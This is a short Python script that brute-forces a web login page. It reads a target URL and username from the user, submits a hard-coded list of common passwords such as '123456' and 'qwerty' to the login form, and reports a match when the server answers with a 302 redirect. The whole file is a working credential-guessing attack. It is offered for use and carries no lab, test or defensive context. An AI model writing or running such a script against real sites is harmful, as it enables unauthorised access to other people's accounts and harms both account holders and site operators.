#  Use Python to brute-force a login page with different passwords.

import requests
import sys

try:
    url = input("Enter a url: ")
    username = input("Enter a username: ")
except KeyboardInterrupt:
    print("\nCTRL + C")
    sys.exit()
    
passwd_list = ["123456", "password", "123456789", "12345678", "12345", "123123", "111111", "qwerty", "abc123", "password1","1111"]

for passwd in passwd_list:
    form_data = {"email":username, "password": passwd, "submit":"login now"}
    req = requests.post(url, data=form_data, allow_redirects=False)
    text = req.status_code
    
    if text == 302:
        print(f"[+] Correct password found: {passwd}")
        break